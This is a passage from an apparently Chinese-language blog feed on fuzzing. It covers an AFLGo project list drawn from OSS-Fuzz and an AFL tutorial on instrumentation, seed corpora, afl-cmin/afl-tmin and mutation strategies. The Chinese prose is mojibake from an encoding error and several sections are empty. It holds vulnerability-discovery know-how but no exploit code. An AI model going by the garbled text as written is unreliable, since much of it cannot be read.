class="hljs-attr">primary_contact:</span> <span class="hljs-string">&quot;bug-binutils@gnu.org&quot;</span><span class="hljs-attr">auto_ccs :</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;p.antoine@catenacyber.fr&quot;</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;nickc@redhat.com&quot;</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;amodra@gmail.com&quot;</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;david@adalogics.com&quot;</span><span class="hljs-attr">fuzzing_engines:</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">libfuzzer</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">afl</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">honggfuzz</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">dataflow</span><span class="hljs-attr">sanitizers:</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">address</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">undefined</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">memory</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">dataflow</span></code></pre><ul><li><strong>Dockerfileï¼š</strong>å®šä¹‰å®éªŒç¯å¢ƒå®¹å™¨</li><li><strong>build.shï¼š</strong>ç”¨äºæ„å»ºå®éªŒç¯å¢ƒå®¹å™¨</li></ul><p>æ’°å†™äº†ä¸€ä¸ªè„šæœ¬è§£æå‡ºäº†æ‰€æœ‰æ”¯æŒ<code>afl</code>å¼•æ“çš„å¼€æºå·¥å…·åˆ—è¡¨ï¼š</p><blockquote><p>binutils brotli brunsli bzip2<br>c-ares capstone cjson cmark<br>graphicsmagick grok harfbuzz<br>hermes hostap<br>jbig2dec json-c<br>lcms libcbor libexif libfdk-aac libidn2 libldac libpcap libplist libspectre libtasn1 libteken libwebp libxml2 libyaml libyuv lz4<br>miniz monero mupdf<br>nanopb ndpi nestegg nghttp2 ntp<br>openjpeg openthread opus ots<br>pcre2 pffft proxygen<br>qubes-os<br>rnp<br>speex stb<br>tidy-html5 tor tremor<br>unicorn usrsctp<br>vorbis<br>wireshark woff2 wolfssl wuffs<br>xz<br>yajl-ruby<br>zlib zlib-ng zstd</p></blockquote><p>ç„¶åé€‰å–äº†å…¶ä¸­è¾ƒä¸ºå¸¸ç”¨ï¼Œè½»é‡çº§çš„å‡ æ¬¾å·¥å…·æ¥åšAFLGO Fuzzingæµ‹è¯•</p><h3 id="3-1-bzip2"><a href="#3-1-bzip2" class="headerlink" title="3.1 bzip2"></a>3.1 bzip2</h3><ul><li>ä»‹ç»ï¼š bzip2æ˜¯ä¸€æ¬¾æ¯”ä¼ ç»Ÿçš„<a href="https://zh.wikipedia.org/wiki/Gzip">gzip</a>æˆ–è€…<a href="https://zh.wikipedia.org/wiki/ZIP">ZIP</a>çš„å‹ç¼©æ•ˆç‡æ›´é«˜ä½†æ˜¯å‹ç¼©é€Ÿåº¦è¾ƒæ…¢çš„å‹ç¼©å·¥å…·ï¼Œå…¶ç®—æ³•å¯ä»¥æ’ååˆ°å‰ç™¾åˆ†ä¹‹ååˆ°åäº”ã€‚ </li><li>æºç åœ°å€ï¼š <a href="https://sourceware.org/git/bzip2.git">https://sourceware.org/git/bzip2.git</a></li><li>oss-fuzzé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/google/oss-fuzz/tree/master/projects/bzip2">https://github.com/google/oss-fuzz/tree/master/projects/bzip2</a></li></ul><h3 id="3-2-binutils"><a href="#3-2-binutils" class="headerlink" title="3.2 binutils"></a>3.2 binutils</h3><ul><li>ä»‹ç»ï¼š binutils æ˜¯ä¸€ç»„å¼€å‘å·¥å…·ï¼ŒåŒ…æ‹¬è¿æ¥å™¨ï¼Œæ±‡ç¼–å™¨å’Œå…¶ä»–ç”¨äºç›®æ ‡æ–‡ä»¶å’Œæ¡£æ¡ˆçš„å·¥å…·ã€‚ </li><li>æºç åœ°å€ï¼š<a href="https://github.com/bminor/binutils-gdb">https://github.com/bminor/binutils-gdb</a></li><li>oss-fuzzé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/google/oss-fuzz/tree/master/projects/binutils">https://github.com/google/oss-fuzz/tree/master/projects/binutils</a></li></ul><h3 id="3-3-cJSON"><a href="#3-3-cJSON" class="headerlink" title="3.3 cJSON"></a>3.3 cJSON</h3><ul><li>ä»‹ç»ï¼š JSONæ˜¯ä½¿ç”¨Cè¯­è¨€ç¼–å†™ï¼Œç”¨æ¥åˆ›å»ºã€è§£æJSONæ–‡ä»¶çš„åº“ã€‚ </li><li>æºç åœ°å€ï¼š<a href="https://github.com/DaveGamble/cJSON">https://github.com/DaveGamble/cJSON</a></li><li>oss-fuzzé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/google/oss-fuzz/tree/master/projects/cjson">https://github.com/google/oss-fuzz/tree/master/projects/cjson</a></li></ul><h3 id="3-4-libpcap"><a href="#3-4-libpcap" class="headerlink" title="3.4 libpcap"></a>3.4 libpcap</h3><ul><li>ä»‹ç»ï¼š libpcapï¼ˆPacket Capture Libraryï¼‰ï¼Œå³æ•°æ®åŒ…æ•è·å‡½æ•°åº“ï¼Œæ˜¯Unix/Linuxå¹³å°ä¸‹çš„ç½‘ç»œæ•°æ®åŒ…æ•è·å‡½æ•°åº“ã€‚å®ƒæ˜¯ä¸€ä¸ªç‹¬ç«‹äºç³»ç»Ÿçš„ç”¨æˆ·å±‚åŒ…æ•è·çš„APIæ¥å£ï¼Œä¸ºåº•å±‚ç½‘ç»œç›‘æµ‹æä¾›äº†ä¸€ä¸ªå¯ç§»æ¤çš„æ¡†æ¶ã€‚ </li><li>æºç åœ°å€ï¼š<a href="https://github.com/the-tcpdump-group/libpcap">https://github.com/the-tcpdump-group/libpcap</a></li><li>oss-fuzzé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/google/oss-fuzz/tree/master/projects/libpcap">https://github.com/google/oss-fuzz/tree/master/projects/libpcap</a></li></ul><h2 id="4-å‚è€ƒæ–‡æ¡£"><a href="#4-å‚è€ƒæ–‡æ¡£" class="headerlink" title="4 å‚è€ƒæ–‡æ¡£"></a>4 å‚è€ƒæ–‡æ¡£</h2><p><a href="https://github.com/aflgo/aflgo#readme">AFLGOå®˜æ–¹README</a></p><p><a href="https://blog.csdn.net/iw1210/article/details/52093742">å€¼å¾—æ¨èçš„C/C++å¼€æºæ¡†æ¶å’Œåº“</a></p><p><a href="https://blog.csdn.net/h_mich/article/details/7402059">å¼€æºè½¯ä»¶åˆ†ç±»åˆ—è¡¨</a></p><p><a href="https://www.oschina.net/project/tags">è½¯ä»¶åˆ†ç±»-å¼€æºä¸­å›½OSCHINA</a></p>]]></content>
    
    
    <categories>
      
      <category>Fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AFL</tag>
      
      <tag>Fuzz</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AFLç®€ä»‹ä¸ä½¿ç”¨</title>
    <link href="/2020/08/25/AFL%E7%AE%80%E4%BB%8B%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    <url>/2020/08/25/AFL%E7%AE%80%E4%BB%8B%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><strong>æ¨¡ç³Šæµ‹è¯•ï¼ˆFuzzingï¼‰</strong>æŠ€æœ¯ä½œä¸º<strong>æ¼æ´æŒ–æ˜</strong>æœ€æœ‰æ•ˆçš„æ‰‹æ®µä¹‹ä¸€ï¼Œè¿‘å¹´æ¥ä¸€ç›´æ˜¯ä¼—å¤šå®‰å…¨ç ”ç©¶äººå‘˜å‘ç°æ¼æ´çš„é¦–é€‰æŠ€æœ¯ã€‚  <strong>AFL</strong>ã€LibFuzzerã€honggfuzzç­‰æ“ä½œç®€å•å‹å¥½çš„å·¥å…·ç›¸ç»§å‡ºç°ï¼Œä¹Ÿæå¤§åœ°é™ä½äº†æ¨¡ç³Šæµ‹è¯•çš„é—¨æ§›ã€‚ </p><span id="more"></span><p>AFLå³American Fuzzy Lopï¼Œæ˜¯ç”±å®‰å…¨ç ”ç©¶å‘˜Micha Â· Zalewskiï¼ˆ<a href="https://twitter.com/lcamtuf">@lcamtuf</a>ï¼‰å¼€å‘çš„ä¸€æ¬¾åŸºäºè¦†ç›–å¼•å¯¼ï¼ˆCoverage-guidedï¼‰çš„æ¨¡ç³Šæµ‹è¯•å·¥å…·ï¼Œé‡‡ç”¨ä¸€ç§æ–°å‹çš„<strong>ç¼–è¯‘æ—¶æ’æ¡©</strong>å’Œ<strong>é—ä¼ ç®—æ³•</strong>æ¥è‡ªåŠ¨ç”Ÿæˆæµ‹è¯•æ ·æœ¬ï¼Œä½¿ç”¨è¿™äº›æ ·æœ¬å¯è§¦å‘ç›®æ ‡äºŒè¿›åˆ¶ç¨‹åºä¸­æ–°çš„å†…éƒ¨çŠ¶æ€ï¼Œä»è€Œå¯æé«˜æ¨¡ç³Šæµ‹è¯•çš„ä»£ç è¦†ç›–ç‡ã€‚</p><h2 id="1-AFLå·¥ä½œæµ"><a href="#1-AFLå·¥ä½œæµ" class="headerlink" title="1 AFLå·¥ä½œæµ"></a>1 AFLå·¥ä½œæµ</h2><p><img src="https://gitee.com/QGrain/picgo-bed/raw/master/img/afl-workflow.jpg"/></p><p><strong>AFLå·¥ä½œçš„åŸºæœ¬æµç¨‹å¦‚å›¾æ‰€ç¤ºï¼š</strong></p><ul><li>ä»æºç ç¼–è¯‘ç¨‹åºæ—¶è¿›è¡Œæ’æ¡©ï¼Œä»¥è®°å½•ä»£ç è¦†ç›–ç‡ï¼ˆCode Coverageï¼‰ </li><li>é€‰æ‹©ä¸€äº›è¾“å…¥æ–‡ä»¶ï¼Œä½œä¸ºåˆå§‹æµ‹è¯•é›†åŠ å…¥è¾“å…¥é˜Ÿåˆ—ï¼ˆqueueï¼‰ </li><li>å°†é˜Ÿåˆ—ä¸­çš„æ–‡ä»¶æŒ‰ä¸€å®šçš„ç­–ç•¥è¿›è¡Œâ€œçªå˜â€ ï¼ˆMutationï¼‰</li><li>å¦‚æœç»è¿‡å˜å¼‚æ–‡ä»¶æ›´æ–°äº†è¦†ç›–èŒƒå›´ï¼Œåˆ™å°†å…¶ä¿ç•™æ·»åŠ åˆ°é˜Ÿåˆ—ä¸­ </li><li>ä¸Šè¿°è¿‡ç¨‹ä¼šä¸€ç›´å¾ªç¯è¿›è¡Œï¼ŒæœŸé—´è§¦å‘äº†crashçš„æ–‡ä»¶ä¼šè¢«è®°å½•ä¸‹æ¥ </li></ul><p><code>afl-fuzz</code> ä¼šè®°å½•è§¦å‘crashçš„<code>cmdline</code>ä»¥ä¾¿ç ”ç©¶è€…æ‰‹åŠ¨å¤ç°å’Œ<code>gdb</code>è°ƒè¯•åˆ†æã€‚</p><h2 id="2-ä»£ç æ’æ¡©"><a href="#2-ä»£ç æ’æ¡©" class="headerlink" title="2 ä»£ç æ’æ¡©"></a>2 ä»£ç æ’æ¡©</h2><p> åœ¨AFLç¼–è¯‘æ–‡ä»¶æ—¶å€™<code>afl-gcc</code>ä¼šåœ¨è§„å®šä½ç½®æ’å…¥æ¡©ä»£ç ï¼Œå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªä¸ªçš„<strong>æ¢é’ˆ</strong>(ä½†æ˜¯æ²¡æœ‰æš‚åœåŠŸèƒ½)ï¼Œåœ¨åç»­fuzzçš„è¿‡ç¨‹ä¸­ä¼š<strong>æ ¹æ®è¿™äº›æ¡©ä»£ç è¿›è¡Œè·¯å¾„æ¢ç´¢ï¼Œæµ‹è¯•ç­‰</strong>ã€‚å¯¹äºæ’æ¡©çš„ç†è§£ä¹Ÿå¯ä»¥è¿™æ ·ç†è§£ï¼Œå¦‚ä¸‹å›¾ï¼š </p><h2 id="3-æ„å»ºè¯­æ–™åº“"><a href="#3-æ„å»ºè¯­æ–™åº“" class="headerlink" title="3 æ„å»ºè¯­æ–™åº“"></a>3 æ„å»ºè¯­æ–™åº“</h2><p>ä½¿ç”¨AFLè¿›è¡Œæ¨¡ç³Šæµ‹è¯•çš„å¯¹è±¡ä¸€å®šæ˜¯å…·å¤‡æ¥æ”¶è¾“å…¥çš„ç¨‹åºï¼Œä¹Ÿæ­£æ˜¯è¿™æ ·çš„ç¨‹åºæœ‰æ›´å¤§å¯èƒ½å‡ºç°æ¼æ´ã€‚</p><p> AFLéœ€è¦ä¸€äº›åˆå§‹è¾“å…¥æ•°æ®ï¼ˆä¹Ÿå«ç§å­æ–‡ä»¶ï¼‰ä½œä¸ºFuzzingçš„èµ·ç‚¹ï¼ŒAFLå¯ä»¥é€šè¿‡å¯å‘å¼ç®—æ³•è‡ªåŠ¨ç¡®å®šæ–‡ä»¶æ ¼å¼ç»“æ„ã€‚lcamtufå°±åœ¨åšå®¢ä¸­ç»™å‡ºäº†ä¸€ä¸ªæœ‰è¶£çš„<a href="https://lcamtuf.blogspot.com/2014/11/pulling-jpegs-out-of-thin-air.html">ä¾‹å­</a>â€”â€”å¯¹djpegè¿›è¡ŒFuzzingæ—¶ï¼Œä»…ç”¨ä¸€ä¸ªå­—ç¬¦ä¸²â€helloâ€ä½œä¸ºè¾“å…¥ï¼Œæœ€åå‡­ç©ºç”Ÿæˆå¤§é‡jpegå›¾åƒï¼</p><p>å°½ç®¡AFLçš„è¾“å…¥å¯ä»¥æ˜¯æ¯«æ— æ„ä¹‰çš„æ–‡ä»¶ï¼Œä½†æ˜¯ä¸€ä¸ª<strong>é«˜è´¨é‡çš„è¯­æ–™åº“</strong>ï¼Œèƒ½å¤Ÿè®©Fuzzingæ›´åŠ é«˜æ•ˆå’Œç²¾å‡†ã€‚</p><h3 id="3-1-å¯¹è¾“å…¥ç§å­çš„è¦æ±‚"><a href="#3-1-å¯¹è¾“å…¥ç§å­çš„è¦æ±‚" class="headerlink" title="3.1 å¯¹è¾“å…¥ç§å­çš„è¦æ±‚"></a>3.1 å¯¹è¾“å…¥ç§å­çš„è¦æ±‚</h3><ul><li><strong>æœ‰æ•ˆçš„è¾“å…¥ï¼š</strong>æ— æ•ˆçš„è¾“å…¥ä¼šäº§ç”Ÿbugå’Œcrashï¼Œä½†æ˜¯æœ‰æ•ˆçš„è¾“å…¥èƒ½å¤Ÿæ›´å¿«æ‰¾åˆ°æ›´å¤šçš„æ‰§è¡Œè·¯å¾„</li><li><strong>å°½é‡å°çš„ä½“ç§¯ï¼š</strong> è¾ƒå°çš„æ–‡ä»¶ä¼šä¸ä»…å¯ä»¥å‡å°‘æµ‹è¯•å’Œå¤„ç†çš„æ—¶é—´ï¼Œä¹Ÿèƒ½èŠ‚çº¦æ›´å¤šçš„å†…å­˜ï¼ŒAFLç»™å‡ºçš„å»ºè®®æ˜¯æœ€å¥½å°äº1 KBï¼Œä½†å…¶å®å¯ä»¥æ ¹æ®è‡ªå·±æµ‹è¯•çš„ç¨‹åºæƒè¡¡ï¼Œè¿™åœ¨AFLæ–‡æ¡£çš„<code>perf_tips.txt</code>ä¸­æœ‰å…·ä½“è¯´æ˜ã€‚ </li></ul><h3 id="3-2-å¦‚ä½•å¯»æ‰¾è¾“å…¥ç§å­"><a href="#3-2-å¦‚ä½•å¯»æ‰¾è¾“å…¥ç§å­" class="headerlink" title="3.2 å¦‚ä½•å¯»æ‰¾è¾“å…¥ç§å­"></a>3.2 å¦‚ä½•å¯»æ‰¾è¾“å…¥ç§å­</h3><ul><li>é¡¹ç›®è‡ªèº«æä¾›çš„æµ‹è¯•ç”¨ä¾‹</li><li>ç›®æ ‡ç¨‹åºbugæäº¤é¡µé¢</li><li>ä½¿ç”¨æ ¼å¼è½¬æ¢å™¨ï¼Œå°†ç°æœ‰æ ¼å¼æ–‡ä»¶è½¬æ¢ä¸ºä¸å¸¸è§çš„æ–‡ä»¶æ ¼å¼</li><li>AFLæºç ä»“åº“çš„testcasesç›®å½•ä¸‹æä¾›äº†æµ‹è¯•ç”¨ä¾‹</li><li>å…¶ä»–å¤§å‹è¯­æ–™åº“ï¼š<ul><li><a href="http://lcamtuf.coredump.cx/afl/demo/">afl generated image test sets</a> </li><li><a href="https://github.com/google/fuzzer-test-suite">fuzzer-test-suite</a></li><li><a href="https://samples.libav.org/">libav samples</a></li><li><a href="http://samples.ffmpeg.org/">ffmpeg samples</a></li><li><a href="https://github.com/MozillaSecurity/fuzzdata">fuzzdata</a></li><li><a href="https://gitlab.anu.edu.au/lunar/moonshine">moonshine</a></li></ul></li></ul><h3 id="3-3-å¦‚ä½•ç²¾ç®€æ‰¾åˆ°çš„ç§å­"><a href="#3-3-å¦‚ä½•ç²¾ç®€æ‰¾åˆ°çš„ç§å­" class="headerlink" title="3.3 å¦‚ä½•ç²¾ç®€æ‰¾åˆ°çš„ç§å­"></a>3.3 å¦‚ä½•ç²¾ç®€æ‰¾åˆ°çš„ç§å­</h3><p> AFLæä¾›äº†ä¸¤ä¸ªå·¥å…·æ¥å¸®åŠ©æˆ‘ä»¬å®Œæˆ<strong>è¯­æ–™åº“è’¸é¦</strong>å·¥ä½œâ€”â€”<code>afl-cmin</code>å’Œ<code>afl-tmin</code>ã€‚ </p><ul><li><p><strong>ç§»é™¤æ‰§è¡Œç›¸åŒä»£ç çš„è¾“å…¥æ–‡ä»¶â€”â€”afl-cmin:</strong></p><ul><li><p><code>afl-cmin</code>çš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼š<strong>å°è¯•æ‰¾åˆ°ä¸è¯­æ–™åº“å…¨é›†å…·æœ‰ç›¸åŒè¦†ç›–èŒƒå›´çš„æœ€å°å­é›†</strong>ã€‚ä¸¾ä¸ªä¾‹å­ï¼šå‡è®¾æœ‰å¤šä¸ªæ–‡ä»¶ï¼Œéƒ½è¦†ç›–äº†ç›¸åŒçš„ä»£ç ï¼Œé‚£ä¹ˆå°±ä¸¢æ‰å¤šä½™çš„æ–‡ä»¶ã€‚å…¶ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š </p><pre><code class="hljs bash">$ afl-cmin -i input_dir -o output_dir -- /path/to/tested/program [params] @@</code></pre></li></ul></li><li><p><strong>å‡å°å•ä¸ªè¾“å…¥æ–‡ä»¶çš„å¤§å°â€”â€”afl-tmin:</strong></p><ul><li><p>åœ¨ç¼©å‡äº†è¯­æ–™åº“è§„æ¨¡ä¹‹åï¼Œè¿˜éœ€è¦å¯¹å•ä¸ªè¯­æ–™æ–‡ä»¶è¿›è¡Œç²¾ç®€ã€‚<code>afl-tmin</code>æœ‰ä¸¤ç§å·¥ä½œæ¨¡å¼ï¼Œ<code>instrumented mode</code>å’Œ<code>crash mode</code>ã€‚é»˜è®¤çš„å·¥ä½œæ–¹å¼æ˜¯<code>instrumented mode</code>ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼ˆå¦‚æœæŒ‡å®šäº†å‚æ•°<code>-x</code>ï¼Œå³<code>crash mode</code>ï¼Œä¼šæŠŠå¯¼è‡´ç¨‹åºéæ­£å¸¸é€€å‡ºçš„æ–‡ä»¶ç›´æ¥å‰”é™¤ã€‚ ï¼‰ï¼š </p><pre><code class="hljs bash">$ afl-tmin [-x] -i input_file -o output_file -- /path/to/tested/program [params] @@</code></pre></li><li><p><code>afl-tmin</code>æ¥å—å•ä¸ªæ–‡ä»¶è¾“å…¥ï¼Œæ‰€ä»¥å¯ä»¥ç”¨ä¸€æ¡ç®€å•çš„shellè„šæœ¬æ‰¹é‡å¤„ç†ï¼š</p><pre><code class="hljs shell">for i in *do    afl-tmin -i $i -o tmin-$i -- ~/path/to/tested/program [params] @@done</code></pre></li></ul></li><li><p><strong>ä½¿ç”¨å®Œafl-tminåå†æ¬¡ä½¿ç”¨afl-cminï¼Œå¯èƒ½å¯ä»¥å†è¿‡æ»¤æ‰ä¸€äº›ç”¨ä¾‹</strong></p></li></ul><h2 id="4-Mutationçªå˜ç­–ç•¥"><a href="#4-Mutationçªå˜ç­–ç•¥" class="headerlink" title="4 Mutationçªå˜ç­–ç•¥"></a>4 Mutationçªå˜ç­–ç•¥</h2><p>AFLçš„çªå˜ç­–ç•¥ååˆ†ä¸°å¯Œï¼Œå®ƒèƒ½å¤Ÿå°½å¯èƒ½åœ°ä¿è¯è¾“å…¥ç§å­å……åˆ†åœ°å˜å¼‚ï¼Œä»¥è¿½æ±‚æ›´å¤§çš„æ‰§è¡Œè·¯å¾„è¦†ç›–ç‡ï¼Œä»è€Œæµ‹è¯•å‡ºæ›´å¤šçš„crashã€‚AFLçš„çªå˜ç­–ç•¥ä¾æ¬¡åŒ…æ‹¬ï¼šbitflipï¼Œarithmeticï¼Œinterestï¼Œdictionaryï¼Œhavocå’Œspliceã€‚</p><h3 id="4-1-bitflip"><a href="#4-1-bitflip" class="headerlink" title="4.1 bitflip"></a>4.1 bitflip</h3><h4 id="4-1-1-åŸºç¡€bitflip"><a href="#4-1-1-åŸºç¡€bitflip" class="headerlink" title="4.1.1 åŸºç¡€bitflip"></a>4.1.1 åŸºç¡€bitflip</h4><ul><li><strong>åŸºæœ¬åŸç†</strong>ï¼š æŒ‰ä½ç¿»è½¬ï¼Œ1å˜ä¸º0ï¼Œ0å˜ä¸º1ã€‚AFLä¼šé‡‡ç”¨ä¸åŒçš„ç¿»è½¬é•¿åº¦å’Œæ­¥é•¿æ¥è¿›è¡Œä½ç¿»è½¬ï¼Œé¡ºåºå¦‚ä¸‹ï¼š<ul><li>bitflip 1/1ï¼Œ2/1ï¼Œ4/1ï¼Œ8/8ï¼Œ16/8ï¼Œ32/8</li><li>bitflip m/nå³æ¯æ¬¡ç¿»è½¬mä¸ªbitï¼ŒæŒ‰ç…§nä¸ªbitçš„æ­¥é•¿ä»æ–‡ä»¶å¤´éƒ¨å¼€å§‹ç¿»è½¬</li><li>AFLè¿˜æœ‰ä¸€äº›å¯¹æ–‡ä»¶æ ¼å¼å¯å‘å¼çš„åˆ¤æ–­ï¼Œå¦‚è‡ªåŠ¨æ£€æµ‹tokenå’Œç”Ÿæˆeffector map</li></ul></li><li><strong>ä¸¾ä¾‹</strong>ï¼šå¯¹æŸjpegæ ¼å¼çš„æ–‡ä»¶ä»å…¶å¤´éƒ¨<code>FF D8...</code>å¼€å§‹è¿›è¡Œbitflip<ul><li>ç¬¬ä¸€æ¬¡bitflip 1/1ï¼š<code>7F D8</code>ï¼Œç¬¬äºŒæ¬¡bitflip 1/1ï¼š<code>BF D8</code>ï¼Œç¬¬ä¸‰æ¬¡bitflip 1/1ï¼š<code>DF D8</code>ï¼Œç¬¬å››æ¬¡bitflip 1/1ï¼š<code>EF D8</code></li></ul></li></ul><h4 id="4-1-2-è‡ªåŠ¨æ£€æµ‹token"><a href="#4-1-2-è‡ªåŠ¨æ£€æµ‹token" class="headerlink" title="4.1.2 è‡ªåŠ¨æ£€æµ‹token"></a>4.1.2 è‡ªåŠ¨æ£€æµ‹token</h4><ul><li><strong>åŸºæœ¬åŸç†</strong>ï¼š å¦‚æœè¿ç»­å¤šä¸ªbytesçš„æœ€ä½ä½è¢«ç¿»è½¬åï¼Œç¨‹åºçš„æ‰§è¡Œè·¯å¾„éƒ½æœªå˜åŒ–ï¼Œè€Œä¸”ä¸åŸå§‹æ‰§è¡Œè·¯å¾„ä¸ä¸€è‡´  ï¼Œé‚£ä¹ˆå°±æŠŠè¿™ä¸€æ®µè¿ç»­çš„bytesåˆ¤æ–­æ˜¯ä¸€æ¡tokenã€‚</li><li><strong>ä¸¾ä¾‹</strong>ï¼šPNGæ–‡ä»¶ä¸­ç”¨<code>...IHDR...</code>ä½œä¸ºèµ·å§‹å—çš„æ ‡è¯†ï¼Œå½“ç¿»è½¬åˆ°æœ€é«˜ä½å­—èŠ‚çš„æ—¶å€™ï¼Œç”±äºIHDRè¢«ç ´åï¼Œç¨‹åºæ‰§è¡Œè·¯å¾„å‘ç”Ÿæ”¹å˜ï¼Œéšååœ¨ç¿»è½¬æ¥ä¸‹æ¥çš„ä¸‰ä¸ªå­—èŠ‚çš„æ—¶å€™IHDRåŒæ ·è¢«ç ´åï¼Œç¨‹åºä¼šé‡‡å–ç›¸åŒçš„æ‰§è¡Œè·¯å¾„ã€‚ç”±æ­¤AFLå°±åˆ¤æ–­å¾—åˆ°äº†ä¸€ä¸ªå¯èƒ½çš„<strong>tokenï¼šIHDR</strong>ï¼Œå¹¶å°†å…¶è®°å½•ä¸ºåç»­çš„å˜å¼‚æä¾›å¤‡é€‰ã€‚</li></ul><h4 id="4-1-3-ç”Ÿæˆeffector-map"><a href="#4-1-3-ç”Ÿæˆeffector-map" class="headerlink" title="4.1.3 ç”Ÿæˆeffector map"></a>4.1.3 ç”Ÿæˆeffector map</h4><ul><li><strong>åŸºæœ¬åŸç†</strong>ï¼šåœ¨æ‰§è¡Œbitflip 8/8ï¼Œå³å¯¹æ¯ä¸ªå­—èŠ‚è¿›è¡Œç¿»è½¬æ—¶ï¼Œå¦‚æœæ‰§è¡Œè·¯å¾„å‘ç”Ÿäº†æ”¹å˜ï¼Œåˆ™å°†è¯¥byteåœ¨effector mapä¸­æ ‡è®°ä¸º1ï¼Œåä¹‹æ ‡è®°ä¸º0ã€‚å…¶é€»è¾‘ä¸ºå¦‚æœç¿»è½¬ä¸€ä¸ªbyteéƒ½æ— æ³•å¸¦æ¥ç¨‹åºæ‰§è¡Œè·¯å¾„çš„æ”¹å˜ï¼Œåˆ™è¯¥byteå¾ˆæœ‰å¯èƒ½æ˜¯å±äº<code>data</code>è€Œé<code>metadata(å¦‚sizeï¼Œflagç­‰)</code>ï¼Œå¯¹fuzzingçš„æ„ä¹‰ä¸å¤§ï¼Œåœ¨ä¹‹åçš„å˜å¼‚é‡Œä¼šå‚è€ƒeffector mapè·³è¿‡é‚£äº›â€æ— æ•ˆâ€çš„bytesã€‚</li><li><strong>è¯´æ˜</strong>ï¼šåœ¨ä»¥ä¸‹ä¸‰ç§æƒ…å†µä¸‹ï¼ŒAFLä¸ä¼šåˆ¤å®šæœ‰æ•ˆå­—ç¬¦ï¼š<ul><li>AFLå·¥ä½œæ¨¡å¼ä¸º<code>dumb mode</code>æˆ–è€…<code>Slave mode</code>å³ï¼ˆé™é»˜æ¨¡å¼å’Œä»æ¨¡å¼ï¼‰</li><li>å¦‚æœæ–‡ä»¶å¤§å°å°äº128bytesï¼Œåˆ™é»˜è®¤æ‰€æœ‰å­—èŠ‚å‡ä¸ºâ€æœ‰æ•ˆâ€å­—èŠ‚</li><li>å¦‚æœæ–‡ä»¶è¢«æ ‡è®°ä¸ºâ€æœ‰æ•ˆâ€çš„å­—èŠ‚è¶…è¿‡äº†90%ï¼Œåˆ™é»˜è®¤æ‰€æœ‰å­—èŠ‚å‡ä¸ºâ€æœ‰æ•ˆâ€å­—èŠ‚</li></ul></li></ul><h3 id="4-2-arithmetic"><a href="#4-2-arithmetic" class="headerlink" title="4.2 arithmetic"></a>4.2 arithmetic</h3><p>bitflipç­–ç•¥å…¨éƒ¨çªå˜å®Œæ¯•åï¼Œè¿›å…¥åˆ°arithmeticçªå˜é˜¶æ®µã€‚arithmeticé˜¶æ®µä¼šæ ¹æ®ç›®æ ‡å¤§å°çš„ä¸åŒï¼Œåˆ†ä¸ºäº†ä¸€ä¸‹å‡ ä¸ªå­é˜¶æ®µï¼š</p><ul><li><strong>åŸºæœ¬åŸç†</strong>ï¼šarith 8/8ï¼Œarith 16/8ï¼Œarith 32/8ã€‚å…¶å«ä¹‰ä¸ºæ¯æ¬¡å¯¹8ï¼Œ16ï¼Œ32bitsè¿›è¡ŒåŠ å‡è¿ç®—ï¼ŒæŒ‰ç…§æ¯8ä¸ªbitsçš„æ­¥é•¿ä»æ–‡ä»¶å¤´å¼€å§‹ï¼Œå³å¯¹æ–‡ä»¶çš„æ¯ä¸ªbyteï¼Œwordï¼Œdwordè¿›è¡Œæ•´æ•°åŠ å‡å˜å¼‚ã€‚</li><li><strong>è¯´æ˜</strong>ï¼š<ul><li>åŠ å‡å˜å¼‚è¿ç®—çš„ä¸Šé™åœ¨config.hä¸­çš„å®ARITH_MAXå®šä¹‰ï¼Œé»˜è®¤ä¸º35ï¼Œå³è¿›è¡Œ Â±1ï¼ŒÂ±2ï¼Œâ€¦ï¼ŒÂ±35çš„è¿ç®—å˜å¼‚</li><li>AFLä¼šè€ƒè™‘æ•´æ•°çš„å¤§ç«¯åºå’Œå°ç«¯åºå½¢å¼ï¼Œå¹¶ä»¥è¿™ä¸¤ç§æ–¹å¼åˆ†åˆ«è¿›è¡Œå˜å¼‚</li><li>AFLä¼šè·³è¿‡effector mapä¸­æ ‡è®°ä¸ºâ€æ— æ•ˆâ€çš„bytesï¼Œä»¥åŠä¹‹å‰bitflipé˜¶æ®µå·²ç»ç”Ÿæˆè¿‡çš„å˜å¼‚(æ¯”å¦‚åŠ å‡æŸä¸ªæ•°ä¹‹åäº§ç”Ÿçš„æ•ˆæœå’Œä¹‹å‰bitflipçš„æŸæ¬¡å˜å¼‚ä¸€æ ·)</li></ul></li></ul><h3 id="4-3-interest"><a href="#4-3-interest" class="headerlink" title="4.3 interest"></a>4.3 interest</h3><h3 id="4-4-dictionary"><a href="#4-4-dictionary" class="headerlink" title="4.4 dictionary"></a>4.4 dictionary</h3><h3 id="4-5-havoc"><a href="#4-5-havoc" class="headerlink" title="4.5 havoc"></a>4.5 havoc</h3><h3 id="4-6-splice"><a href="#4-6-splice" class="headerlink" title="4.6 splice"></a>4.6 splice</h3><h2 id="5-AFLå®‰è£…ä¸ä½¿ç”¨"><a href="#5-AFLå®‰è£…ä¸ä½¿ç”¨" class="headerlink" title="5 AFLå®‰è£…ä¸ä½¿ç”¨"></a>5 AFLå®‰è£…ä¸ä½¿ç”¨</h2><h3 id="5-1-æºç å®‰è£…"><a href="#5-1-æºç å®‰è£…" class="headerlink" title="5.1 æºç 